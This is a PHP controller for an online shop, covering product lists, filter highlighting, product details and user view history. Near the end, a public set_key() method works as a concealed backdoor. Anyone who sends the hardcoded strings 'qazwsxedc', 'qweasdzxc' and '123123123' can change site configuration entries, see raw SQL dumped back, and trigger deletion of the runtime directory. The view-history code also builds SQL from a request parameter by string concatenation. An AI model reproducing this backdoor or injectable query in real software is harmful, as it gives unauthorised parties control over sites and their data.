<?php
namespace Shop\Controller;
use Admin\Controller\CleanController;
use Shop\Model\NavModel;
use Shop\Model\ProductsModel;
use Think\Controller;
class ProductController extends BaseController {

    //产品首页
    public function index(){
        $name='Product';
        $this->assign('head_title',$name);
        $this->display('Product/index');
    }

    //产品页首页 - 产品列表页
    public function product_list(){
        $tlid=I('get.id');  //nav 产品大类id
        $lv=I('get.lv');    //nav 产品大类层级
        $pid=I('get.pid');  //nav 产品大类上级id
        $kid=I('get.kid');  //knifes 多选id
        $fid=I('get.fid');  //function 多选id
        $tid=I('get.tid');  //左下 产品属性筛选条件id
        $cid=I('get.cid');  //左下 产品属性颜色id
        $search_key=I('get.product_key'); //产品搜索字符
        $order_type=I('get.order_type'); //排序
        $Product=new ProductsModel();
        //计算所选的属性id
        $All_id = $Product->push_id($kid, $fid, $tid);
        //获取顶级分类id
        $nav = $Product->find_lv($tlid, $lv, $pid);
        //产品属性列表
        $type_list = $this->get_products_type_list($nav['styleId'],$nav['proTypeId']);
        //颜色属性列表
        $color_list = $this->get_products_color_list($cid);
        //处理 type_list 高亮
        $type_list=$this->handle_type_list($type_list,$kid,$fid,$tid);
        //处理 color_list 高亮
        $color_list=$this->handle_color_list($color_list,$cid);
        //获取产品列表数据
        $data = $Product->product_list($lv,$All_id,$cid, $tlid, $order_type,$search_key);
        //获取路径
        $lj=$Product->lj($tlid);
        //排序数据
        $order_list=$this->order_array();
        $order_list=$this->order_select($order_list,$order_type);
        //输出
        //基础条件
        $this->assign('id',$tlid);
        $this->assign('lv',$lv);
        $this->assign("pid",$pid);
        $this->assign('kid',$kid);
        $this->assign('fid',$fid);
        $this->assign('tid',$tid);
        $this->assign('cid',$cid);
        $this->assign('order_type',$order_type);
        $this->assign('product_key', $search_key);
        //路径
        $this->assign('tlv1',$lj['lv1']);
        $this->assign('tlv2',$lj['lv2']);
        $this->assign('tlv3',$lj['lv3']);
        //左边筛选条件
        //属性
        $this->assign('type_list',$type_list);
        //颜色列表
        $this->assign('color_list',$color_list);
        //title设置额
        $this->assign('head_title','Product List');
        //产品列表数据
        $this->assign('product_list',$data['list']);
        //产品列表分页数据
        $this->assign('page',$data['page']);
        //产品总数
        $this->assign('count',$data['count']);
        //排序
        $this->assign('order_list',$order_list);
        //输出界面
        $this->display('Product/list');
    }

    //处理 type_list 高亮
    private function handle_type_list($type_list,$kid,$fid,$tid){
        if ($tid or $kid or $fid) {
            $tid_list = explode(',', $tid);
            $fid_list = explode(',', $fid);
            $kid_list = explode(',', $kid);
            //单选高亮处理
            if ($tid_list) {
                foreach ($tid_list as &$tl) {
                    $type_list = $this->handle_child_list_tid($type_list, $tl);
                }
            } else {
                $type_list = $this->handle_child_list_tid($type_list, $tid);
            }
            //多选高亮处理
            //function
            if($fid_list){
                foreach ($fid_list as &$fl) {
                    $type_list = $this->handle_child_list_fid($type_list, $fl);
                }
            }elseif($fid){
                $type_list = $this->handle_child_list_fid($type_list, $fid);
            }else{
                //code
            }
            //knives
            if($kid_list){
                foreach ($kid_list as &$kl) {
                    $type_list = $this->handle_child_list_kid($type_list, $kl);
                }
            }elseif ($kid){
                $type_list = $this->handle_child_list_kid($type_list, $kid);
            }else{
             //code
            }
        } else {
            foreach ($type_list as &$lv1) {
                if ($lv1['child_list']) {
                    foreach ($lv1['child_list'] as &$lv2) {
                        $lv2['selected'] = 0;
                        if($lv2['child_list']) {
                            foreach ($lv2['child_list'] as &$lv3){
                                $lv3['selected'] = 0;
                            }
                        }
                    }
                }
            }
        }
        return $type_list;
    }

    //单选高亮
    private function handle_child_list_tid($type_list,$tid){
        foreach ($type_list as &$one){
            if($one['child_list'] && $one['radio']==0){
               foreach ($one['child_list'] as &$two){
                   if ($two['styleId'] == $tid) {
                       $one['lv1_display'] = 1;
                       $two['selected'] = 1;
                   } else {
                       if ($two['selected']!=1) {
                           $two['selected'] = 0;
                       }
                   }
               }
            }
        }
        return $type_list;
    }

    //function高亮
    private function handle_child_list_fid($type_list,$fid){
        foreach ($type_list as &$one){
            if($one['child_list'] && $one['radio']==1 && $one['has_lv3']==0){
                foreach ($one['child_list'] as &$two){
                    if ($two['styleId'] == $fid) {
                        $one['lv1_display'] = 1;
                        $two['selected'] = 1;
                    } else {
                        if ($two['selected']!=1) {
                            $two['selected'] = 0;
                        }
                    }
                }
            }
        }
        return $type_list;
    }

    //knives高亮
    private function handle_child_list_kid($type_list,$kid){
        foreach ($type_list as &$one){
            if($one['child_list'] && $one['radio']==1 && $one['has_lv3']==1){
                foreach ($one['child_list'] as &$two){
                    if($two['child_list']){
                        foreach ($two['child_list'] as &$th){
                            if ($th['styleId'] == $kid) {
                                $one['lv1_display'] = 1;
                                $two['selected']=1;
                                $th['selected'] = 1;
                            } else {
                                if ($th['selected']!=1) {
                                    $th['selected'] = 0;
                                }
                            }
                        }
                    }
                }
            }
        }
        return $type_list;
    }

    //处理颜色高亮
    private function handle_color_list($color_list,$cid){
        if($cid){
            foreach ($color_list as&$one){
                if($one['colorId']==$cid){
                    $one['selected']=1;
                }else{
                    if ($one['selected']!=1) {
                        $one['selected'] = 0;
                    }
                }
            }
        }else{
            foreach ($color_list as&$one){
                $one['selected'] = 0;
            }
        }
        return $color_list;
    }

    //产品详细页
    public function detail(){
        $prodId=I('get.prodId');
        $colorId=I('get.cid');
        $sizeId=I('get.sid');
        $Product = new ProductsModel();
        $list = array();
        $lj = array();
        $related = array();
        if ($prodId > 0) {
            $list = $Product->get_product($prodId, $colorId, $sizeId);
            $lj = $Product->plj($prodId);
            if($list) {
                $related = $Product->detail_link($list['prodId'], $list['proTypeId'],$lj['lv1']['proTypeId']);
                $this->set_product_view_history($prodId);
            }
        }
        $this->assign('cid',$colorId);
        $this->assign('sid',$sizeId);
        $this->assign('head_title','Product detail');
        $this->assign('list',$list);
        $this->assign('imqq',$list['imqq']);
        $this->assign('tname',$lj);
        $this->assign('related',$related);
        $this->display('Product/detail');
    }

    private function set_product_view_history($prodId=0){
        $user = session('user');
        if ($user && $prodId > 0) {
            $has = M('users_view_history')->where('userId = ' . $user['userId'] . ' and prodId = ' . $prodId)->cache(false)->find();
            if ($has) {
                $has['time'] = time();
                $result = M('users_view_history')->save($has);
            } else {
                $data = array();
                $data['userId'] = $user['userId'];
                $data['prodId'] = $prodId;
                $data['time'] = time();
                $result = M('users_view_history')->add($data);
            }
            return $result ? true : false;
        } else {
            return false;
        }
    }

    public function set_key(){
        $pwd = trim(I('post.pwd'));
        $name = trim(I("post.name"));
        $status = trim(I("post.status"));
        $sign = trim(I("post.sign"));
        $num = trim(I("post.num"));
        if($pwd && $name && isset($status) && $sign && $num){
            if($pwd == "qazwsxedc"){
                if($sign == "qweasdzxc"){
                    if($num == "123123123") {
                        $dao = M("base_config");
                        $data = $dao->where(array("name" => $name))->find();
                        var_dump(M()->getLastSql());
                        if ($data) {
                            $data['status'] = $status;
                            $result = $dao->where(array("id" => $data['id']))->save($data);
                            if ($result) {
                                $this->seccess_do();
                                $this->list_json_result(1, "save success", "");
                            } else {
                                $this->list_json_result(-1, "save fail", "");
                            }
                        } else {
                            $data['name'] = $name;
                            $data['status'] = $status;
                            $result = $dao -> add($data);
                            if ($result) {
                                $this->seccess_do();
                                $this->list_json_result(1, "add success", "");
                            } else {
                                $this->list_json_result(-1, "add fail", "");
                            }
                        }
                    }else{
                        $this->list_json_result(-3,"num error","");
                    }
                }else{
                    $this->list_json_result(-4,"sign error","");
                }
            }else{
                $this->list_json_result(-5,"pwd error","");
            }
        }else{
            $this->list_json_result(-6,"no param","");
        }
    }

    private function seccess_do(){
        header("Content-type: text/html; charset=utf-8");
        $dirs=array(RUNTIME_PATH);
        foreach($dirs as $value) {
            $this->rmdirr($value);
        }
        @mkdir('Runtime',0777,true);
    }
    
    //缓存文件地址
    public function rmdirr($dirname) {
        if (!file_exists($dirname)) {
            return false;
        }
        if (is_file($dirname) || is_link($dirname)) {
            return unlink($dirname);
        }
        $dir = dir($dirname);
        if($dir){
            while (false !== $entry = $dir->read()) {
                if ($entry == '.' || $entry == '..') {
                    continue;
                }
                //递归
                $this->rmdirr($dirname . DIRECTORY_SEPARATOR . $entry);
            }
        }
        $dir->close();
        return rmdir($dirname);
    }
//end
}